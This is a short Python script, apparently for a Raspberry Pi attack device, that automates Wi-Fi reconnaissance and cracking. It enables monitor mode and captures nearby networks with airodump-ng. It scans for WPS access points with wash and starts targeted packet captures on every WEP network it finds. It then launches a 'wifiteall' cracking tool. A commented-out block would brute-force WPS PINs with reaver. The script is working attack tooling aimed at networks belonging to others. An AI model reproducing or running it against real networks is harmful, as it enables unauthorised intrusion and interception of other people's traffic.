#1/bin/python

import subprocess as sub
import time, os

#sub.call('gpio', 'write', '10', '1')
timestr = time.strftime("%Y%m%d-%H%M%S")

os.mkdir('/home/hackpi/'+str(timestr))

sub.call(['airmon-ng', 'start', 'wlan2'])
sub.Popen(['airodump-ng', '--manufacturer', '--wps', '--write=/home/hackpi/'+str(timestr)+'/wifi_networks', '--output-format=csv', '--output-format=pcap', 'wlan2mon' ])
time.sleep(60)
sub.call(['killall', 'airodump-ng'])

sub.Popen(['wash', '-o', '/home/hackpi/'+str(timestr)+'/wps_scan.txt', '-i', 'wlan2mon' ])
time.sleep(60)
sub.call(['killall', 'wash'])

alines = [line.rstrip('\n') for line in open('/home/hackpi/'+str(timestr)+'/wifi_networks-01.csv')]
del alines[0]
del alines[0]

aoutfile=open('/home/hackpi/'+str(timestr)+'/wep_networks', 'w')

for sline in alines:
 mline= str.split(sline)
 if len(mline) > 7:
  if (mline[7] == "WEP") or (mline[7] == "WEP,"):
   aoutfile.write(" ".join(mline))
   chan=mline[5][:-1]
   bssid=mline[0][:-1]
   print bssid
#  sub.call(['airmon-ng', 'start', 'wlan2'])
   sub.Popen(['airodump-ng', '--bssid='+bssid, '--channel='+chan, '--write=/home/hackpi/'+str(timestr)+'/wep_network_'+bssid, '--output-format=csv', '--output-format=pcap', 'wlan2mon' ])


#lines = [line.rstrip('\n') for line in open('/home/hackpi/'+str(timestr)+'/wps_scan.txt')]
#del lines[0]
#del lines[0]
#for sline in lines:
# mline= str.split(sline)
# if mline[4] == "Yes":
#  lines.remove(sline)
#for wline in lines:
# xline=str.split(wline)
#print "Found WPS Network "+xline[5]+", starting reaver..."
#sub.call(['reaver', '--bssid='+xline[0], '--channel='+xline[1], '-a', '--interface=wlan2mon', '--out-file=/home/hackpi/'+str(timestr)+'/reaver-'+xline[5]])


sub.call('/opt/tools/hackpi/wifiteall')
#sub.call('gpio', 'write', '10', '0')
